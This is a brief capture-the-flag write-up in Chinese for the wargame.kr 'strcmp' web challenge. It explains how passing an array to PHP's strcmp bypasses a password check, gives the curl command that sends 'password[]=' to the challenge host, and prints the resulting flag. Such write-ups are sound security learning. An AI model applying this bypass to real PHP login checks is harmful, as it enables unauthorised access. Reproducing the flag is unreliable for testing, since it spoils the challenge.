題目

> if you can bypass the strcmp function, you get the flag.

![index](/CTFWriteup/Web/assets/[wargame.kr]strcmp/image.png)

查看原始碼

![source code](/CTFWriteup/Web/assets/[wargame.kr]strcmp/image-1.png)

這是 PHP strcmp 漏洞，strcmp()在比較兩個字串時，如果相等就會回傳 0，提供 NULL 或 array 可能會讓strcmp() 運行異常。

```sh
curl -X POST http://host1.dreamhack.games:9344/ -d "password[]="
```

![flag](/CTFWriteup/Web/assets/[wargame.kr]strcmp/image-2.png)

```
DH{aede9e7fa4ccb8225f12040a16bdfd37c0c5d2f0}
```

#Blitz CTF #9 #Web
